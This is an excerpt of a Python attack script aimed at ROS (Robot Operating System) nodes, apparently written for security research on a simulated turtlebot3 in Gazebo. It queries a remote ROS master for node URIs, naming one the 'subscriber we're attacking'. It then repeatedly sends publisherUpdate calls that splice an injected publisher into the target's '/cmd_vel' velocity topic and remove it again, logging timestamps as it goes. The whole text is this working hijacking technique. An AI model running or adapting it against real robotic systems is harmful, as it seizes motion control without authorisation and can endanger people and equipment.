...
# Find the URI's of:
_, _, subNodeURI = remoteRosMaster.lookupNode("/Ros_Services", "/gazebo") # Subscriber we're attacking
_, _, originalPubNodeURI = remoteRosMaster.lookupNode("/Ros_Subscriber_Services", "/turtlebot3_drive") # Publisher it's listening to
...
with open("attackTimestamps.txt", "w") as timeFile:
    while True:
        print(f"Publisher Update call to {subNodeURI} on '/cmd_vel': [{originalPubNodeURI},{injectedPubNodeURI}]")
        targetSubscriber.publisherUpdate("/Ros_Subscriber_Services", "/cmd_vel", [originalPubNodeURI,injectedPubNodeURI])
        ...
        print(f"Publisher Update call to {subNodeURI} on '/cmd_vel': [{originalPubNodeURI}]")
        targetSubscriber.publisherUpdate("/Ros_Subscriber_Services", "/cmd_vel", [originalPubNodeURI])
